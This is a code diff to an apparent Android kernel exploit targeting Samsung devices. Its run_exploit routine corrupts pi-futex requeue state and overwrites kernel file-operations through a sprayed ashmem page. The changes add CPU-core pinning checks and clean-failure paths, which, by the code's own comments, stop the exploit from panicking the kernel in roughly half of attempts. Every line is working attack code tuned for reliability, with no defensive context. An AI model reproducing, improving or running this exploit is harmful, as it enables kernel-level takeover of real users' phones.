@@ -649,9 +649,25 @@ int run_exploit(int argc, char **argv) {
   init_ashmem_path();
 
 #if defined(RMG_PIN_TEST_PRIME)
-  rmg_revalidate_pinned_core();
-#endif
+  /* Stability gate (2026-08-27): the whole attempt requires a legally
+   * pinnable perf-core pair (choreography core + consumer core). When the
+   * cpuset only allows LITTLE cores (app migrated to /background), the
+   * a715-calibrated channel misfires and the unpinned write stage panics
+   * the kernel ~50% of the time — fail the attempt cleanly instead and
+   * let the supervisor/reboot ladder retry from a better state. */
+  if (!rmg_pin_gate_ready()) {
+    pr_error("no perf-core placement available (cpuset wall); failing "
+             "attempt cleanly\n");
+    return 1;
+  }
+  if (!pin_to_core_strict(CORE)) {
+    pr_error("choreography core cpu=%d not pinnable; failing attempt "
+             "cleanly\n", CORE);
+    return 1;
+  }
+#else
   pin_to_core(CORE);
+#endif
 #if defined(SLIDE_STACK_WRITER) && \
     defined(SLIDE_STACK_WRITER_SIGRETURN) && \
     SLIDE_STACK_WRITER == SLIDE_STACK_WRITER_SIGRETURN
@@ -713,7 +729,18 @@ int run_exploit(int argc, char **argv) {
 #endif
 #endif
 
+#if defined(RMG_PIN_TEST_PRIME)
+  /* Re-validate before the page/write stages: Samsung PM can shrink the
+   * cpuset mid-attempt (observed: constructor cpu7 -> attempt cpu5 ->
+   * later consumer pin cpu6 EINVAL). */
+  if (!rmg_pin_gate_ready() || !pin_to_core_strict(CORE)) {
+    pr_error("pre-page placement lost (cpuset wall); failing attempt "
+             "cleanly\n");
+    return 1;
+  }
+#else
   pin_to_core(CORE);
+#endif
 #if !defined(APP_FOPS_REUSE_VERIFIED_PAGE) || \
     !APP_FOPS_REUSE_VERIFIED_PAGE
   page_base = prepare_good_kernel_page(PAGE_PAYLOAD_FOPS);
@@ -841,12 +868,19 @@ int run_exploit(int argc, char **argv) {
   }
 #else
   start_p0_ref_keeper();
-  /* pinning-test hybrid: kernelsnitch scan + controlled-mm reclaim are
-   * P-core tolerant (e2e-verified), but the pi-futex/pselect write
-   * choreography is calibrated to the LITTLE pair. Hand the main thread
-   * back to the calibrated literal for the write stages. */
+  /* Write-stage placement (2026-08-27 stability rework): the main thread
+   * stays on the LITTLE-calibrated literal for the pi-futex/pselect write
+   * choreography, while the consumer thread must sit on a legally pinned
+   * perf core (rmg_pin_gate_ready re-checks NOW, right before the danger
+   * window). Running the consumer unpinned let the kernel consume the
+   * corrupted requeue state at scheduler mercy and panicked ~50% of
+   * attempts; the gate fails the attempt cleanly instead. */
   pin_to_core(RMG_CORE_LITERAL);
   durable_log_checkpoint("fops-pre-pin-little");
+  if (!rmg_pin_gate_ready()) {
+    pr_error("fops write stage pin gate failed; failing attempt cleanly\n");
+    return 1;
+  }
   for (int attempt = 1; attempt <= 1; attempt++) {
     int triggered = app_trigger_fops_slide_route();
     pr_info("app fops stage=trigger-return attempt=%d triggered=%d\n",
